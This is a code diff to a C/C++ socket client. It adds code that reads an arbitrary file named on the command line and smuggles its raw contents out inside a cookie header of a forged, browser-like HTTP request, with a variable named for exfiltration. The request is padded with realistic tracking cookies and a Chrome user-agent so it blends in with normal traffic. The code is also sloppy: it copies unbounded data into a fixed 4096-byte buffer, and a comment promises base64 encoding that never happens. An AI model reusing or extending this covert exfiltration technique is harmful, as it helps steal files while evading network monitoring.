@@ -56,11 +56,46 @@ int main(int argc, char const *argv[])
 	//{
   char send_data[4096];
   strcpy(send_data,"GET /");
-	strcat(send_data,"test.txt");
-	strcat(send_data," HTTP/1.1\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\naccept-encoding: gzip, deflate, br\r\naccept-language: en-US,en;q=0.9\r\ncache-control: max-age=0\r\ncookie: dsl25_frhf=control; ccpa=true; dsl25_frhf_tracked=1; bf_visit=u%3D.ysp8Kdb1gg%26uuid%3D32b7bead-28bc-44e7-9c36-68f60481bf2f%26v%3D2; tracking_facebook=on; tracking_facebook_version=1; ads_scroll_subscription=on; ads_scroll_subscription_version=1; ads_prebid=on; ads_prebid_version=1; ads_amazon_tam=on; ads_amazon_tam_version=1; ads_ad_lightning=on; ads_ad_lightning_version=1; ads_adrizer=on; ads_adrizer_version=1; ads_moat=on; ads_moat_version=1; ads_blockthrough=on; ads_blockthrough_version=1; moat_dfp_native_video_tracking=on; moat_dfp_native_video_tracking_version=1; advertise_international=on; advertise_international_version=1; non_us_ad_lookahead_adjustments=on; non_us_ad_lookahead_adjustments_version=1; ADSGROUP-442-permutive=on; ADSGROUP-442-permutive_version=1; ADS-1351_promo-inline-display-cards=control; ADS-1351_promo-inline-display-cards_version=2; qualtrics_intercepts=on; qualtrics_intercepts_version=1; OOA11Y-159-shopping-newsletter=variant1; OOA11Y-159-shopping-newsletter_version=1; ADRIZER_SOURCE={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; ADRIZER_WIDGET={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; bf-xdomain-session-uuid=df9a3f5b-91ce-4e99-bd5d-749fe4fa4463; _cmpQcif3pcsupported=1; _ga=GA1.2.1619320656.1583095627; _gid=GA1.2.1139481407.1583095627; _gat=1; permutive-session=%7B%22session_id%22%3A%2241092298-2f23-472d-b18c-9f180aaacc70%22%2C%22last_updated%22%3A%222020-03-01T20%3A47%3A07.508Z%22%7D; sailthru_pageviews=1; __qca=P0-2089884155-1583095627339; z_derived_epik=\"");
-  //Contents of file
-	strcat(send_data,"testFileContent");
-	strcat(send_data,"\r\nupgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36\r\n");
+	strcat(send_data,argv[3]);
+	strcat(send_data," HTTP/1.1\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\naccept-encoding: deflate, br\r\naccept-language: en-US,en;q=0.9\r\ncache-control: max-age=0\r\ncookie: dsl25_frhf=control; ccpa=true; dsl25_frhf_tracked=1; bf_visit=u%3D.ysp8Kdb1gg%26uuid%3D32b7bead-28bc-44e7-9c36-68f60481bf2f%26v%3D2; tracking_facebook=on; tracking_facebook_version=1; ads_scroll_subscription=on; ads_scroll_subscription_version=1; ads_prebid=on; ads_prebid_version=1; ads_amazon_tam=on; ads_amazon_tam_version=1; ads_ad_lightning=on; ads_ad_lightning_version=1; ads_adrizer=on; ads_adrizer_version=1; ads_moat=on; ads_moat_version=1; ads_blockthrough=on; ads_blockthrough_version=1; moat_dfp_native_video_tracking=on; moat_dfp_native_video_tracking_version=1; advertise_international=on; advertise_international_version=1; non_us_ad_lookahead_adjustments=on; non_us_ad_lookahead_adjustments_version=1; ADSGROUP-442-permutive=on; ADSGROUP-442-permutive_version=1; ADS-1351_promo-inline-display-cards=control; ADS-1351_promo-inline-display-cards_version=2; qualtrics_intercepts=on; qualtrics_intercepts_version=1; OOA11Y-159-shopping-newsletter=variant1; OOA11Y-159-shopping-newsletter_version=1; ADRIZER_SOURCE={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; ADRIZER_WIDGET={%22value%22:%22%22%2C%22expires%22:%222020-03-03T20:47:06.533Z%22}; bf-xdomain-session-uuid=df9a3f5b-91ce-4e99-bd5d-749fe4fa4463; _cmpQcif3pcsupported=1; _ga=GA1.2.1619320656.1583095627; _gid=GA1.2.1139481407.1583095627; _gat=1; permutive-session=%7B%22session_id%22%3A%2241092298-2f23-472d-b18c-9f180aaacc70%22%2C%22last_updated%22%3A%222020-03-01T20%3A47%3A07.508Z%22%7D; sailthru_pageviews=1; __qca=P0-2089884155-1583095627339; ~_derived_epik=\"");
+  //Contents of file 109 characters long
+  //Will be file pointer
+  FILE *exfil_p;
+  //Will hold file data
+  unsigned char *data_buffer;
+  //Will be file length
+  unsigned long data_len;
+
+  //Open File in read binary mode
+  exfil_p = fopen(argv[3], "rb");
+  //Make sure its not null
+  if (exfil_p == NULL)
+  {
+    perror("ERROR WHILE OPENING FILE.\n");
+    exit(EXIT_FAILURE);
+  }
+  //Move pointer to end of file
+  fseek(exfil_p, 0, SEEK_END);
+  //Get length of file
+  data_len = ftell(exfil_p);
+  //Move pointer back to Start
+  fseek(exfil_p, 0, SEEK_SET);
+  //Set length of buffer (Allocate Proper Amount of Memory)
+  data_buffer = (unsigned char *)malloc((data_len + 1)*sizeof(unsigned char));
+  if (!data_buffer)
+  {
+    //Throw error if buffer length wasnt set correctly
+    perror("MEMORY ERROR.\n");
+    fclose(exfil_p);
+    exit(EXIT_FAILURE);
+  }
+  //Read data of file to data_buffer
+  fread(data_buffer, data_len, 1,exfil_p);
+  //Close the file
+  fclose(exfil_p);
+  //encode base 64 data
+	strcat(send_data,reinterpret_cast <const char *>(data_buffer));
+	strcat(send_data,"\"upgrade-insecure-requests: 1\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36\r\n");
 	send(sock , send_data , strlen(send_data) , 0 );
 	valread = read( sock , buffer, 11885);
 	printf("%s\n",buffer );
